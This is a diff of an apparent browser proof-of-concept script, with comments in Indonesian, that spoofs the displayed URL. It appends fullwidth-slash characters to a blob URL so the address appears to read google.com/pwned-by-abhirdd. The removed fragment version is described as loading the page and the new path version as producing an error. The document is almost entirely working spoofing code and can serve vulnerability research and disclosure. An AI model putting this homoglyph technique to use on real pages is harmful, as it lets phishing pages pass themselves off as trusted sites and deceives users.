@@ -40,9 +40,11 @@
         return URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
       }
 
-      // Fragment display-spoof: google.com + pwned. Fragment = komponen
-      // terakhir, isinya bebas, dan TIDAK mengganggu resolve blob URL.
-      var FRAGMENT = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
+      // Suffix path (TANPA #): google.com + pwned jadi bagian path, bukan
+      // fragment. Hasil: URL tampil persis ".../<uuid>／google.com／pwned-by-abhirdd"
+      // tapi blob gak ke-resolve di https -> halaman ERR_FILE_NOT_FOUND.
+      // (Perilaku terkonfirmasi: fragment (#) = LOAD, path = error.)
+      var SUFFIX = '%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
 
       // Catatan penting (ditemukan via eksperimen):
       //  - file:// : Chrome match blob URL EXACT-STRING -> hanya canonical
@@ -55,17 +57,17 @@
 
       if (location.protocol === 'file:' || location.origin === 'null') {
         var uf = makeUrl();
-        log('[main] mode file:// -> canonical blob:null + fragment');
-        log('[main] target: ' + uf + FRAGMENT);
-        location.replace(uf + FRAGMENT);
+        log('[main] mode file:// -> canonical blob:null + path suffix (no hash)');
+        log('[main] target: ' + uf + SUFFIX);
+        location.replace(uf + SUFFIX);
         return;
       }
 
       setTimeout(function () {
         var u = makeUrl();
-        log('[main] mode https -> canonical blob + fragment');
-        log('[main] target: ' + u + FRAGMENT);
-        location.replace(u + FRAGMENT);
+        log('[main] mode https -> canonical blob + path suffix (no hash)');
+        log('[main] target: ' + u + SUFFIX);
+        location.replace(u + SUFFIX);
       }, 1200);
     })();
   </script>
